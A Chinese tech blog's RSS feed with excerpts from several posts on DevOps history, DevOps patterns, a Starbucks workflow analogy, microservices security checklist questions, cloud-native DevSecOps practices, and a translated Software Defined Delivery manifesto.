十年前，云计算的普及程度远不如当今。很多企业开始采用虚拟化技术（严格的说，那时候还不能称作是云）来解决资源不足和设备异构的问题。简单的说，你可以接虚拟化技术是在异构的设备上构建了一个通用适配层。使得各种不同的应用程序和设备能够通过通用的操作进行统一的管理，那时候面临这样问题多是通信、银行、政府、石油等关键领域。即便 IBM，Oracle，EMC 微软等都有“整体解决方案”，但为了避免供应商绑定风险，政府还是希望能够“混搭”：通过做大蛋糕来降低风险。当然，这种做法也降低了效率。然而当虚拟化技术解决了异构问题之后，基础设施资源被抽象为网络、计算、存储三类资源。由于业务的异构性，企业级领域迟迟没有解决方案。毕竟为了让虚拟化的资源能够尽快产出价值，往虚拟资源的迁移工作相关的集成工作占据了工作主要内容。
于是运维工程师和网络工程师慢慢远离机房，和系统工程师以及数据库工程师坐在了一起，共同成为了“脚本工程师”。
此时，Linux 开始通过 Xen 和 KVM 侵蚀传统 UNIX 厂商的市场份额。SCO，AIX 和 HP-UX 这些过去按卖 License 获得售后服务的方式毕竟太贵了。可以说，借由 Linux 虚拟化技术的云计算技术给商业 UNIX 来了一记补刀，如今你很少能看到这些商业 UNIX 了。
虚拟化技术把所有的空闲资源收集到了一起，这些资源完全可以在不增加基础设施设备投入的情况下运行更多的应用程序。拟化技术还可以通过整合小型设备，得到和大型设备一样的表现。
但是，如果你通过虚拟化节约出来的空闲资源你使用不了，但是还要收取电费，这就是很大的浪费。于是有些人则想到了把这些空闲的资源租出去，变成一个单独的业务。这就是另外一个故事了，我们稍后会提到。
随着 VMware，Oracle，Cisco，IBM 推出了各自的解决方案，“脚本工程师”们开始考虑如何管理大量的空闲资源。随着敏捷软件开发逐渐成为主流，基础设施的变更效率显然满足不了敏捷的迭代速度。基础设施的变更带来的风险和周期远远大于应用。如何让基础设施敏捷起来，成为了敏捷软件开发在交付最后一公里需要迫切解决的问题。
这时候，由于规模和复杂度都很大，脚本工程师们考虑的第一个问题就是：如果规模没办法改变，我们就降低复杂度吧。
Puppet 和 Chef 的短暂辉煌 # Puppet 是第一个嗅到这个商机的工具，它在第2010年8月的技术雷达上出现在了“试验”环里。
Ruby 很适合构建领域特定语言（DSL），继 Cucumber 在这方面的成功探索后，脚本工程师们希望通过 DSL 缩小 Dev 和 Ops 之间的差距。作为同一时期的竞争者，Chef 以对开发人员更加友好的方式出现。Chef 相比 Puppet 更有竞争力的一点就是对于 Windows 的支持。
不过，由于缺乏最佳实践，Puppet 和 Chef 很快就被玩坏了，复杂性的治理难度超过预期。随着治理规模的扩大，Puppet 和 Chef 带来的负面效应逐渐显现。曾经有人这样讽刺 Puppet：
Puppet 就像蟑螂。当你刚开始用了 Puppet，慢慢的你会发现你的代码库里到处都是 Puppet。
此外，事实证明 Ruby 是一个便于开发，但是难于维护的语言。Ruby 及其社区的频繁发布和不兼容特性使得后期接手维护的脚本工程师们叫苦不迭，加之 Ruby 工程师的招聘成本和培训成本都更高。即便 Ruby 的 Puppet 和 Chef 工具学习曲线比较平缓，但遗留的基础设施即代码的学习曲线却非常陡峭。基础设施的变更风险很大，且缺乏必要的质量实践，特别是主从模式的中心化还带来了单点故障和复杂度，这些都使得基础设施代码越来越难以维护。
在敏捷团队中，去中心化、自治的团队往往是被提倡的。于是 Puppet 推出了 standalone 模式，Chef 出现了 chef-solo 这样去中心化的特性。技术雷达很快就出现了与之相对的Librarian-puppet and Librarian-Chef 和 Masterless Chef/Puppet这样去中心化的实践。</description></item><item><title>DevOps 模式 - 采用模式语言讨论 DevOps</title><link>https://wwww.guyu.me/posts/2019-05-18-about-devops-patterns/</link><pubDate>Sat, 18 May 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-05-18-about-devops-patterns/</guid><description>2018年的5月，DevOps 实践手册作者&amp;quot;四人帮&amp;quot;之一的 John Willis 来到了北京，在 DevOps 国际峰会上做了一场名为&amp;quot;DevOps：Almost 10 Years - What A Strange Long Trip It&amp;rsquo;s Been&amp;ldquo;的演讲。除了这个演讲的 PPT 只有一张很长的图片以外，坐在台下的我对他在这篇演讲中 DevOps 的定义有了共鸣。在这次演讲中，他将 DevOps 定义如下：
翻译过来就是&amp;quot;DevOps 是一组实践和模式，用来将人力资本转化为高效能的组织资本&amp;rdquo; 。
关于这段定义，我深以为然。
然而，在不同的场合和其他人交流时，我对 DevOps 的实践产生了忧虑。一方面，我看到很多朋友在落地某些 DevOps 实践中，由于缺乏经验，出现了种种阻碍 DevOps 产生效益的问题。另一方面，尽管论述如何做 DevOps 的材料足够多。但几乎都是告诉我们&amp;quot;成功的 DevOps”是什么样的，而“出现了问题怎么办”的内容却乏善可陈。
我发现很多问题在不同组织的 DevOps 转型中反复遇到，而解决这些问题的方式和碰到的问题也大同小异。因此，我开始把这些常见有效的做法和常见的错误做法总结下来，并采用模式的语言对其进行分类整理和描述，形成了 &amp;ldquo;DevOps 模式&amp;rdquo;。
下面，我将这套 DevOps 模式语言的基本格式介绍给你。
DevOps 模式类别 # DevOps 的模式分为以下五类：
**策略模式：**在设计长期的 DevOps 改进中的方向。 **组织模式：**在不同类型、不同规模的组织下的团队分工合作方式。 **管理模式：**提升组织表现的日常工作的流程、活动和制度。 **技术模式：**服务于管理模式的工具及其实践。 **文化模式：**用于提升团队 DevOps 文化的一些活动和方法。 DevOps 模式的格式 # DevOps 模式的将采用下述格式描述：
模式名称：用来描述模式的正式名称，这个名称描述了该模式的特征。
模式别名：其它方便记忆的其它名称，别名一般包含了某种助记隐喻。
模式类别： 策略模式、组织模式、管理模式、技术模式和文化模式的其中一种。
风险： 采用该模式可能会带来的风险。风险包括以下三种：
低 - 不用担心，放心采用。该模式没有特殊的场景和附加条件。 中 - 采用的时候要注意场景和条件，否则会出现反模式。 高 - 请在实践过 DevOps 的专家指导下采用，轻易采用会带来严重的后果。 **价值：**采用该 DevOps 模式的转型收益。转型收益包括以下三种：
低： 采用该模式只会产生短期的收益。 中： 采用该模式产生中期固定的收益，但要持续做。 高： 采用该模式会对组织产生长期的收益。 **见效时间：**采用该 DevOps 模式的转型收益。转型收益包括以下三种：
慢： 4 周内看不到显著改进。 普通： 2 - 4 周可看到显著改进。 快： 2 周内可看到显著改进。 说明： 对模式的描述和说明。以及产生的收益和风险。</description></item><item><title>从星巴克店面运营学习 DevOps</title><link>https://wwww.guyu.me/posts/2019-05-10-how-starbucks-play-devops/</link><pubDate>Fri, 10 May 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-05-10-how-starbucks-play-devops/</guid><description>某次在星巴克等咖啡的时候，闲来无事开始观察店员的的工作。可能是出于职业习惯，我开始观察和分析星巴克的工作流程。突然发现星巴克的咖啡交付过程很像一个敏捷软件开发团队的交付过程。后来通过进一步观察和细聊，发现星巴克的店面运营是一个 DevOps 运作的榜样。
如果我们把星巴克的店员们看做是一个开发/运维团队，把咖啡的交付看作软件的交付，把店面的基础设施维护和清洁看作是运维工作。我们就发现了一个很好的 DevOps 学习榜样。
让我们看看星巴克店面是如何做 DevOps 的。
星巴克咖啡交付团队的角色组成 # 在星巴克里，大家都相互称对方为星伙伴。我个人理解是通过弱化职级称谓提升每个人的责任心。所有的店员分为四个角色：
店面主管（SS或IC）：负责店面整体的管理。
收银：负责点单、推荐产品和收款。
吧台：负责制作饮品。
CS：负责门店补货，清理桌面。
店面主管主要负责团队的任务安排，你可以把它当做是 PM 或者 Scrum Master。在一切都井然有序的情况下，他的工作和一般的员工是一样的。只要他发现了临时需要处理的情况，他才会根据店面的资源来安排临时性的工作。
吧台内部分为三个部分：收银点单区、咖啡制作区、咖啡待取区，如下图所示：
收银点单区的店员根据客人的需求点单，然后记录到咖啡杯上。
咖啡制作区的店员会根据杯子上的标记制作饮品。
制作完成后的咖啡会放到咖啡待取区等客人来取。
所有的店员都具备所有的技能（全栈工程师），并通过标准化的考试上岗。你会看到在星巴克里有绿色围裙和黑色围裙。黑色围裙的咖啡师是经过考试的，考试合格后会发黑色围裙作为通过认证的标志。
反思：你的工程师有标准化的技能考试吗？
星巴克咖啡交付团队的 DevOps 单向工作流 # 说到 DevOps，不能不提到&amp;quot;三步工作法&amp;quot;。首先，我们要用到第一步——构建端到端单向工作流——来观察星巴克店面是如何构建单向工作流的。
我们可以把交付一杯咖啡的流程和软件开发的交付一个用户故事的流程的关系做如下对应：
需求分析：和客人交流并记录客人对咖啡的需求。
产品开发：按照需求制作咖啡。
产品发布：制作完成并通知客人取咖啡。
基础设施运维：咖啡店面的日常清扫和补货。
在这个基础上，我们看看一杯咖啡从点单开始，星巴克的持续交付流水线就是它设备的摆放顺序，确保杯子的单一方向流动，避免返工和逆向流动。
点单：虽然星巴克的咖啡是流水化工业制品。但是也是存在定制的，比如类别、口味、冷热、大小。虽然顾客有需求，但需求控制在一定范围之内(哪些做得到，哪些做不到)并且通过产品价位板告知顾客。
反思：你的团队能做什么，不能做什么，什么时候做完，你是否对交付成果有信心？这些信心来自哪里？如果没有信心，如何获得信心？
标记：在点单阶段，收银会把客户的每一个需求记录到杯子上，包括顾客的姓名。星巴克咖啡采取的是“预付费”(先付费再生产)而非“后付费”（先生产再买单）的方式。这些记录是对一杯咖啡需求验收标准的分解。通过杯子大小来控制每个需求点的验收和用量。
反思：你的团队开发需求时是否把每个验收条件记录下来并且在不同的阶段控制质量和用时？
制作：每个带着记号的咖啡杯就是一个格式化的需求文档。上面详细的记录了这个顾客的需求，并且这些需求可以验证。每杯咖啡都有标准的验收样例和工序，所以每个店员都知道完成的标准是什么。这样，即便不是点单的店员，看到杯子上的记号，也能做出符合顾客验收条件的咖啡。此外，每个杯子上都会有顾客姓名的标记，以免点错单。
反思：你的团队需求文档中的信息是否可以做到无解释交接？
出品：星巴克“完成”的定义是“顾客拿到了咖啡”，而不是“咖啡制作完毕”。如果顾客没有确认拿到的咖啡符合需求，是没有完成的。如果顾客对咖啡不满意，是可以要求重做的。这时候，会由专门的店员负责重新制作咖啡，直到顾客满意为止。
反思：你的软件开发流程中“完成”的定义是开发完成？测试完成？还是上线发布完成？
制作区运营：星巴克从点单开始，到制作咖啡过程中所有的设备、物料、卫生等都要每天维护使之保持最佳使用状态。这些基础设施的使用都是高可用且可以按需伸缩的：两个收银机、两台咖啡机——如果一台坏了，有另外一台备份。默认情况下只使用一台，如果到了忙时两台才会同时使用。这一切都要通过星巴克店面的看板信号机制来动态协调。
反思：你的软件交付基础设施和人员是否具备动态协调的能力？为什么？
星巴克咖啡交付的看板系统 # 当我们构建了单向的价值流之后，来看看星巴克是如何应用 DevOps 第二工作法——构建快速反馈的。
首先，从上述流程中，我们可以看到星巴克的四个积压队列(Backlog)，分别是：点单队列、待制咖啡队列、制作中咖啡队列、待取咖啡队列。
这四个队列构成了星巴克咖啡交付的看板系统，每个环节都是一个单独的队列，并且通过不同的看板可视化积压情况。
点单队列 # 如果你正在点单，收银员会在你犹豫的时候帮你推荐。然后它会记下你姓名，咖啡的类别和定制化的要求。并记录在杯子上，放到待做咖啡队列。
一般星巴克的店面都会有两个收银台。平常的情况下只有一名星伙伴收银。如果有客户在收银机排队，就是需求分析资源不足的信号，收银台需要补人。收银台补人的原则是把两个人看作一个单位，如果超出了 2.5 个单位。收银台需要再补充另外一个人。如果两个收银还是不够，值班主管会让一个伙伴拿着点单卡(如下图)提前记录客人需要。这样可以节约在收银台前的时候，客人选择和犹豫时耽误的时间。
这样就避免了点单队列（需求分析）的积压。
待做咖啡杯队列和饮品制作流水线 # 此时待做咖啡队列就是一个个打上标记的空杯子。当空杯子数量超过5个，吧台里就需要有第二个人参与咖啡的制作，以减少待做队列里的积压。
简单的说，一杯标准的意式咖啡会包括三个环节：
制作浓缩咖啡(Espresso)。 制作奶沫。 混合并添加糖浆/冰块等配料。 在这三步中，第一步制作浓缩咖啡是需要等待的，在这期间星伙伴可以选择同时做其它的咖啡、制作奶沫或者增加配料。所以，咖啡不是一杯一杯交付的，而是一批一批交付的。</description></item><item><title>从技术雷达看 DevOps 的十年——DevOps与持续交付</title><link>https://wwww.guyu.me/posts/2019-04-16-devops-and-techradar-anniversary-devops-and-continous-delivery/</link><pubDate>Tue, 16 Apr 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-04-16-devops-and-techradar-anniversary-devops-and-continous-delivery/</guid><description>本文原文发表于 2019 年 4 月 16 日的 ThoughtWorks 洞见，后经过修改发表到博客上。
2009 年底，比利时根特举办了第一届 DevOpsDays。ThoughtWorks 的咨询师Chris-Read 作为嘉宾之一，代表 ThoughtWorks 出席了这次活动并带来名为 “持续集成，流水线和部署”的演讲。ThoughtWorks 作为 DevOps 运动最早的见证者和奠基人，并没有意识到这个周末聚会将在接下来 10 年给全球 IT 行业带来的深远影响。
1 个月后，ThoughtWorks 发布了第一期的技术雷达。作为一个新兴的名词，DevOps 还没有成熟到让令人瞩目的阶段。然而，即便 DevOps 还没有被纳入技术雷达，但与之相关的早期实践和工具都已出现。在接下来的十年中，DevOps 已经成为每期技术雷达不可或缺的一部分。从这个角度上说，技术雷达就是 DevOps 发展的见证者。
DevOps 和技术雷达都将迎来自己的不愁之年。作为 IT 行业技术的先行指标，技术雷达上面的技术平均领先行业 3 至 5 年。也就是说，出现在技术雷达 采纳和 试用区域的技术，在 3 - 5 年后大概率将成为业界主流。
作为 DevOps 和技术雷达的粉丝，我想从技术雷达的角度总结 DevOps 的发展历程。该系列文章共分为三篇，分别是：
DevOps 和持续交付 基础设施即代码和云计算 容器技术和微服务 本文为“DevOps 和技术雷达的十年”系列文章第一篇：DevOps 和 持续交付。
DevOps # 虽然持续集成、构建流水线和持续部署从技术雷达创刊号就存在。但 DevOps 作为一个正式条目进入技术雷达的评估象限是在 2010 年 8月的第三期技术雷达。那时，对 DevOps 的描述是这样的：
DevOps 是一个新的运动，在寻找可以满足业务需要的快速交付的软件和稳定的生产环境。它拥有两个目标：首先， 让开发和运维的合作更加紧密。其次，在运维流程中应用敏捷实践（协作，自动化，简单化）来处理初始化虚拟机，变更管理和生产环境监控。它包含文化、流程和工具，全部用于支持更好的沟通，快速的交付和反馈以及可预测的产出上。
半年后，DevOps 运动所引发的影响越来越大。2011 年 1 月，DevOps 作为条目进入了 “试用” 区域。这意味着至少 ThoughtWorks 内部已经全然接受 DevOps 。在这一期的技术雷达中，对 DevOps 的描述做了一些调整：
DevOps 运动持续让人们关注经常断裂的开发和运维关系。DevOps 提升了开发和运维的合作以及共同的责任。DevOps 在运维过程中应用敏捷实践, 初始化虚拟机，变更管理和生产环境监控并为开发阶段引入了近似生产环境的思维，工具和环境。DevOps 是对一个想对应用发布到生产环境实施持续交付的关键基础。</description></item><item><title>【翻译】微服务安全：所有应该被问到的问题</title><link>https://wwww.guyu.me/posts/2019-03-22-security-questions-for-microservices/</link><pubDate>Fri, 22 Mar 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-03-22-security-questions-for-microservices/</guid><description>本文节选自 Graham Lea 的博客：Microservices Security: All The Questions You Should Be Asking
GitHub（含中文翻译）地址：https://github.com/wombat-bros-sisters/answers-to-microservices-security-questions
以下是我的问题列表, 您和您的团队应该向自己询问有关微服务安全性的问题。它旨在用作评估您自己的系统和流程的清单。希望你会发现你已经涵盖了这些问题中的大多数, 但总是有更多的东西需要学习。每个问题之后都有一个相关内容的链接。
核心服务（Core Services） # (我指的是组成您的系统的服务, 不与互联网或其他外部系统接口)
您是否只是在互联网边界保护您的系统？(纵深防御) 如果入侵者进入您的核心网络, 您有哪些保护措施？(纵深防御) 网络中的某个人在多大程度上可以轻松地访问您的服务之间的流量？(安全通信) 您的服务之间是不是过于相互信任？或者，你的服务是不是无条件相信高频调用者(您确定只有您自己的服务可以调用您自己的服务吗？)(勉强信任) 当您的服务被调用时, 它是否要求调用方对进行身份验证, 或者它是否允许任何连接请求？(服务认证) 您的服务是让调用者访问服务提供的所有 API, 还是只允许他们访问履行其功能所需的 API？(服务授权) 在客户端发起每个调用请求的人的身份是否会传递到您的内部服务中, 还是在网关中丢失？(当事人传播) 您的服务是否可以相互请求任何数据, 或仅请求授予其权限的用户的数据？(当事人授权) 如果攻击者拥有某个服务, 他们是否可以很容易地从其下游服务中请求任何内容？(当事人授权) 您有什么保证措施从经过身份验证的用户收到的请求没有被篡改？(防篡改) 您如何确保第二次发送的授权请求被检测和拒绝？(重播保护) 是不是每个人都理解 SQL 注入？您有哪些措施来确保没有人编写容易受到 SQL 注入的代码？(SQL 注入) 您是否熟悉所有其他类型的注入, 以及如何预防？(SQL 之外的注入) 您是否掌握了密码存储的最新状态？(密码存储) 您是否意识到, 如果您的密码数据库被盗, 如今简单的撒盐加密是完全无用的？(密码存储) 如果您需要升级密码存储算法, 如何在不对用户造成大规模干扰的情况下进行升级？(密码存储) 如何积极识别数据库中的私有和敏感数据？(私隐提升) 如果您的数据被盗, 您有哪些保护措施来防止最敏感的部分被读取？(私人和敏感数据) 如果您的服务使用的是私钥, 如何保护这些密钥不被入侵者使用？(密钥管理, 千万不要以为您的秘密是安全的) 您知道什么是硬件安全模块 (Hardware Security Module，HSM), 以及何时以及如何使用硬件安全模块吗？(密钥管理) 您有哪些日志记录可用于检测和分析安全漏洞？(安全日志记录/安全信息和事件管理 (Security Information and Event Management ，SIEM)) 中间件（Middleware） # (我指的是您在系统和界面中运行的任何第三方软件。在我的公司里, 目前这主要是我们的数据库和邮件系统, 但它可能包括其他系统, 例如 bpm 和 中间件。这些问题大多也适用于集成的外部软件。
您是否在所有服务中共享一个数据库登录权限？(最少特权) 您的服务可以访问多少数据？是所有的？还是只有他们必须的？(最少特权) 如果攻击者获得了一个服务的数据库凭据, 他们将获得多少数据？(最少特权) 您的数据库授权策略是否允许更新和删除应用程序仅插入到的表？(最少特权) 您是否在所有服务中共享单个消息传递中间件登录？(最少特权) 您的消息传递中间件是否也有登录凭据？(有些还没有!)(最少特权) 您的服务是否有权访问系统中的所有消息, 还是只能访问他们需要查看的邮件？(最少特权) 您的服务是否可以将消息发送到任何队列, 或仅将消息发送到所需的队列？(最少特权) 如果攻击者掌握了一个消息服务的凭据, 他们可以访问多少数据？(最少特权) 如果攻击者掌握了一个消息服务的凭据, 他们可以启动哪些操作？(最少特权) 如果您使用登录凭据保护数据库和消息, 如何保护凭据？(千万不要以为你的秘密是安全的) 架构中的遗留系统如何使其他服务处于危险之中？(保护最薄弱的环节) 边缘服务（Edge Services） # (我指的是与互联网或其他外部管理的第三方系统接口的服务)</description></item><item><title>云原生下的 DevSecOps 实践</title><link>https://wwww.guyu.me/posts/2019-03-17-cloudnative-devsecops-practices/</link><pubDate>Sun, 17 Mar 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-03-17-cloudnative-devsecops-practices/</guid><description>云原生的安全挑战 # 云环境的安全跟企业内网的安全是不一样的，有可能我做一个网络分段，拔一根网线就安全了，但是云计算是不太一样的。先说一下在 DevOps 的发展历程中安全相关的发展，在 DevOps 运动的早期，你会看家大家是不提安全的，只提合作和自动化。
怎么样把开发和运维两端能够更快的进行沟通，提出我们的交付效率和问题响应速度，安全仍然只是传统运维上已经有的安全内容，但是并不会单独考虑安全在 DevOps 中的重要性。
但是你会发现慢慢的随着自动化程度增强，你会觉得这个安全也是实践 DevOps 中的一个瓶颈，你要解决这个问题，我不如把安全放到 DevOps 整个环里面作为重要的一环来考虑，我们会把一些安全的手段自动化加入到 DevOps 流程中。
像昨天讲到的，我们会把一些扫描放到持续交付流水线里面，我们会在线做一些验证，但是这些所谓的 DevOps 更多的有 DevOps 网站，我们把安全手段通过自动化的方式加入到 DevOps 的反馈环和流水线，这就是 DevSecOps。
然而，在云原生环境下，我们需要在一个安全的框架下，重新考虑 DevOps，设计DevOps 的人员、场景、使用。通过更多的方式，而不仅仅是自动化的方式，在座有没有做安全的同学？有没有做 DBA 数据库的？有点可惜。
希望大家可以理解。你在做安全的时候，你会发现更多的安全问题是人为因素。因为我们技术上的保证尤其是在运维层面已经非常成熟了，你只要符合某个规范，把安全的点都考虑到，其实你运维端的安全就已经做得不错了。
我们可能偏向于应用端的安全，应用端的安全有一个BSI，在你的整个应用开发周期里面考虑安全因素，你的应用有可能是你的安全最大的漏洞。但是你考虑这一点以后，你会发现DevOps不好串起来、也不好用，我们要考虑人的因素在DevOps体系里面是怎么样的。
软件定义安全 # 在座了解 BeyondCorp 的同学有吗？谷歌去年发表了一篇论文，这篇论文讲的是在未来的云环境下怎么定义安全。因为在云环境下要连接第三方服务和不同供应商之间就会更加复杂，它安不安全你是不知道的，它不安全会造成非常大的损失，它所能受到的是很大的影响。 这是一个模型，有相应的论文，后面我会把论文全篇发送给大家。他在里面讲到三个原则：
第一个原则是所有网络都不可信，所有网络包括你自己的网络都是不可信的，比如在企业里面我的PC笔记本电脑和企业无线路由器连接的网络也是不可信的，你不要以为在企业里面有企业内网，电脑设备就一定安全了，这种情况下在 BeyondCorp 里面所有网络都是不可信的。
第二是基于已知的用户和设备进行授权访问，如果网络是不可信的，你要访问资源一定要经过用户和设备进行授权访问。在座的有没有不知道是MFA多因子认证的？MFA是我们比较通用的一个实践，在如何确定你是你的问题上，这几个元素里面、这几个因子里面，你只要满足其中两个就可以证明你是你。
第三个原则是对所有服务的访问必须进行身份验证，授权和加密。我们想到再做一个安全小调查，从用户的输入开始到最后存储数据库里面所有部分都进行加密的同学请举手，我们可能想到第一个问题是麻烦，第二个问题是可能有性能问题，现在加密技术的性能还是不错的，但是会有一些麻烦，而麻烦和应用性之间是有一个平衡的。在这里面我们在Beynod和Corp里面，为了保证数据安全性，我们一定要做身份授权和加密。
另外一个是3R企业安全—云原生的安全，这是他们给的标题，我觉得这个非常不错。有没有听过3R企业安全的？这证明我的实践比较新，这也是去年的实践。什么叫3R呢？一是Rotate，经常更新用户的口令，每天都更新数据库密码的同学请举手？一天更新几次？
这个做得不错，等一会儿我要介绍跟你一样的实践。二是Repave从0开始构建，每天从基础设施开始构建的同学请举手，我的网络和机器全部拆掉了，每天把应用重新构建一次，没有，我举手。三是Repair及时打补丁，这个我相信有同学做吧，每天做这个的举手，你们的运维做得非常不错，等一会儿解释一下。
数据库流水线 # 这是我们做的案例，没有人管理密码的数据库。大家可以看到，这是一个数据库用户常见分析结构，Root是数据库最大的权限。在所有的用户里面没有一个活着的人知道用户密码的，Root有下面所有的权限，包括有用户管理和配置管理的权限，以及下面所有的权限。 Power User是DDL语言，每一个都是针对我们数据库权限的访问，通过这种分层访问的方式来决定数据库里面的用户分配。我们应用访问数据库也会有一个用户，就是App User，目前是没有人知道密码的。我们首先会有权限架构，权限架构会扩大分配应用。
我们的数据库是构建了一个流水线，前年有一个实践叫基础设施流水线，我们建立了一个数据库流水线。从左边到右边看，左边第一个配置是把PaaS平台的网络配置关于数据库的配置好，如果有变动就相当于重新建。 当然我们用了一些高可用的手段，让它的变动不那么大，我们会新建数据库，用PaaS平台数据库配置。数据库配置文件，建好数据库之后需要配置文件，当然数据库配置文件完成之后需要数据库重启。但是有些 PaaS 平台包括公有云不用重启，创建之后这两边就变成一块了，这是我说的数据库的基础设施。 这里左边是数据基础设施，右边是数据库实例，我们把这些全部放到流水线里面。而这两份除了最基本的创建用户、删减用户、增加用户名和密码之后，我们可能还有一些用户数据是由应用程序触发的，我们就会放到另外一条流水线里面。 这边完成之后会驱动这边。所以我们可以做到每天把数据库重新干了再恢复，中间会有一个差额，这个数额我们会通过打标志的方式迁移过来。 另外一种比较快的方式是数据库镜像，现在很多公有云数据库会做数据库镜像，很快就能还原出数据库实例。我知道在AWS上有一个没有服务器实例的数据库，大家有兴趣的可以尝试一下，当然中国区应该没有，是在国外的区域。
没有人管理的密码数据库还有一点，就是我们的应用流水线。我们每次应用部署的时候都会更新访问应用的用户名密码。我们的方式是每次部署的时候创建一个新的用户，我们的用户名就是 app-user-version，每次部署的时候都会有新的用户，他的密码是自动随机生成的。每次生成密码的时候，按需可以随机创建新的基础设施，如果我的配置没有变更，他的变动是很小的，是秒级的，可能我点基础设施没有变动就快速过去了。
另外一点，在这个基础设施上再部署新的应用，你会奇怪自动创建新用户的权限是哪里的。这个自动创建新用户的权限，我们会取得一个临时的权限，在创建完新用户之后取得一个权限，不是Root权限。
创建权限之后再把它的权限回收，我创建完用户之后就把用户权限回收了，也就是说，保证我使用这个权限的时候，当场的情况下只有一次授权，谁都没有碰过任何用户名密码，因为我每次用户名密码都是自动随机生成的，只有应用程序自己知道密码是什么样的，这是我们每次部署都会更换密码的一个方式。 我们在以前创建应用数据中心的时候是从左边开始的，网络到应用程序我们都管，后面我们有云之后，到 IaaS 平台的时候，操作平台可能是 IaaS 平台给定的，上面是我们处理的。到了 PaaS 和 SaaS 之后有更多事情交给云环境，我们所需要写的程序越来越少。我前面说到，后 DevOps 时代你所需要管理的基础设施是越来越少的，但是管理基础设施的复杂度会越来越高。
Serverless First # 什么叫做无服务器优先。就是我们在发布应用程序的时候制定以下原则，作为一个程序员，我希望:
我写的代码直接部署到某个地方就可以运行(FaaS); 若1不可得，那就把我的运行时和代码一起打包直接部署运行。（利用Docker 或者 虚拟机镜像） 若2还是不行，那我希望能够把我需要的运行时在代码部署前自动化配置好。(Infrastructure as code) 若3再不可得，我希望能够有API支持我用代码配置环境。(API) 也就是说，当你开始写代码的时候，首先就要做好如何部署的准备。然后通过部署的方式来定义你的开发模型。在所有的部署方式里，Serverless 无疑是成本最低、稳定性最好的。之后的几条部署方式的稳定性则越来越弱。
这里讲到CLI calls API，你做的事情是通过你的命令和API处理的。在座有没有用过AWS应用的，它会给你一个命令，AWS应用后面跟着服务、服务跟着操作，每个操作都可以通过CLI工具完成，这个东西是非常好编程的。而不是给你一大堆核心界面点来点去，那样的东西是非常不好管理的。
这种面向资源的计算思维，每次CLI API都是异步的，性能上还会好一点。另外一点是在这种情况下你需要有全云端运维机制，知道你所对应的资源是不是完成你所要完成的工作，这就是一种方式。
右边是国外比较通用的，左边是对应的产品。以前我们做应用性能测试的时候要买点做各种各样的事情，自己要开发、自己要找工具、自己要搭建。我们现在首先我们用这些运维工具，我们不再自己搭建了，我们在云端就用云端的服务，非常成熟。
比如说查日志，我们看到很多ELK教程，很多人都把ELK搭建起来，但是现在已经不太用了，有从ELK调整到EFK的吗？我们已经不再用自己搭建的方式，而是买成熟实践和稳定实践的方式做这件事情。全云端运维，右边是国内对应的产品。
全云端在线协作开发，AWS上的Cloud9被AWS收购的，我们的整个开发环境都是在云上的。你只要有一个浏览器，不需要在自己的配置上装安装包、装Java，虽然Java马上要收费了，我们未来可能不会再用Java了，我们会用全云端在线协作开发。
国内也有同样的产品叫行云趣码，这个产品跟前面的Cloud9不一样，行云趣码产品可以接不同的云环境。你只要有任何的云环境，就可以在上面搭建这样的环境。所以你的开发人员入门使用这些东西的时间就会大大缩短，我打开浏览器就开发了，不用考虑语言冲突和各种SDK的麻烦。
另外一个是FaaS应用，函数即服务。最早是 AWS Lambda，我两年前讲 AWS Lambda的时候还是一个很新的概念，这两年各种平台都已经出现了。你只写应用端的一些代码，剩下的都不需要管。</description></item><item><title>【翻译】软件定义交付宣言</title><link>https://wwww.guyu.me/posts/2019-03-14-sdd-manifesto/</link><pubDate>Thu, 14 Mar 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-03-14-sdd-manifesto/</guid><description>原文链接：https://github.com/sdd-manifesto/manifesto 中文链接：https://github.com/wizardbyron/manifesto
软件定义交付宣言（Software Defined Delivery Manifesto） # 我们认识到, 提供有用的软件塑造了我们的世界。我们认识到，代码是指定精确操作的最佳方式。我们认识到, 只有在交付代码时, 代码才会有用。
交付不是一个细节, 而是我们的工作。现在是将我们的核心技能应用到自己的工作中的时候了。现在是时候 工程化 我们的交付。我们在人类自身和计算机之间分配我们的工作: 人类用于决策, 而自动化用于任务。
交付不是一个细节，而是我们的工作。现在是应用我们的核心技术到我们工作中的时刻了。现在是工程化我们的交付。我们在我们自身和计算机之间区分我们的工作：人类为了决策，自动化为任务。
交付工作本质上是独特的。应用程序、组织、部署环境和团队的每个组合都有自己的上下文。我们认识到, 每个团队都需要理解这种独特性的交付和自动化。我们认识到, 虽然持续交付对于满足业务需求至关重要, 但自动化所有重复的任务非常重要。
我们加快自动化的速度与加快应用程序开发的方式相同: 使用现代体系结构和编程语言以及用于通用能力的框架、库和服务。
我们承认现有技术。这不是发明的工作, 而是表达的工作, 是及时和急需的方法的工作。
交付基础设施现在是可编程的, 所以我们将对其进行编程。
软件定义交付（Software Defined Delivery）是 # 核心： 交付是每个软件团队和组织的基本和战略能力。
一流的： 交付代码就是生产代码。 战略性： 决定团队和组织层面的政策;在代码中精确地实现它, 而无需辛劳。 演进： 随着我们的了解, 我们不断地改进我们的交付。 工程化的: 在可靠的、可测试的代码中。
现代软件架构: 事件驱动并可扩展。 现代编程语言: 逻辑最好在代码中指定, 而不是在图片或 GUI 中指定。脚本不会扩张。 基于模型: 由软件领域的模型支持, 包含对代码的理解。 可测试: 允许部署在生产前进行较短的交付周期以发现错误。 进步: 随时促进部署。提供对受众群体和环境进行有控制、选择性的更改。允许是渐进和深思熟虑的发布。 协作:
在人群中: 每个人都可以通过代码表达他们的专业知识, 以造福于每个人。 在软件中: 我们使用同类最佳的工具, 但我们对这些工具的组合是独一无二的。 在人群和软件中: 协作自动化增强了我们的感知, 并实现了我们的决策。它将信息和行动带到我们所处的位置, 并使自动化行为为我们所理解。通过代码, 我们区分团队的共享交付目标集和它们的实现。 加速:
通过自动化: 我们自动执行重复的任务, 以加快我们的工作, 避免错误。 通过复用: 开发人员、团队和组织之间共享通用功能。 可观察的: 常见的方法是观察和排除作为生产系统的交付过程中发生的情况。
